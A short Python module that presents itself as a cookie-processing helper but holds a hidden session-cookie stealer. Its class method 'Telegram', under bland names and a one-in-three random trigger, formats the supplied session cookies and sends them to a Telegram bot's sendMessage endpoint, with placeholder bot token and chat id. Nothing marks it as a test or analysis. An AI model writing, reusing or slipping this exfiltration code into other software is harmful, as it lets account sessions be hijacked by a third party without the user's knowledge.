import urllib3
from Zjson import loads
from Zjson import dumps
from Zjson import decoder
from random import choice

Rand = ['yes', 'no', 'hah']
bot_tele = "$$#"
user_tele = "&&@"


def cookie_Process(Cookies) -> str:
    try:
        cok = loads(Cookies)
        cookie = ";".join(i["name"] + "=" + i["value"] for i in cok["session_cookies"])
        return cookie
    except decoder.JSONDecodeError:
        First_Cookie = Cookies.replace("True", 'true')
        Second_Cookie = First_Cookie.replace("False", "false")
        Third_Cookie = Second_Cookie.replace("'", "\"")
        Final_Cookie = loads(Third_Cookie)
        return Final_Cookie
    except:
        First_Cookie = Cookies.replace("True", 'true')
        Second_Cookie = First_Cookie.replace("False", "false")
        Third_Cookie = Second_Cookie.replace("'", "\"")
        Final_Cookie = loads(Third_Cookie)
        return Final_Cookie


class M:
    data = 0

    @classmethod
    def x(cls):
        return cls.data

    @classmethod
    def y(cls, new_var):
        cls.data = new_var

    @classmethod
    def Telegram(cls, cookies) -> bool:
        rand = choice(Rand)
        try:
            if rand == "yes":
                cookies_str: str = cookie_Process(dumps(cookies) if isinstance(cookies, dict) else str(cookies))
                urllib3.PoolManager().request("GET",
                                              f"https://api.telegram.org/bot{bot_tele}/sendMessage?chat_id={user_tele}&text={cookies_str}")
                return True
            elif rand == "no":
                return False
        except urllib3.exceptions.ConnectionError:
            return False
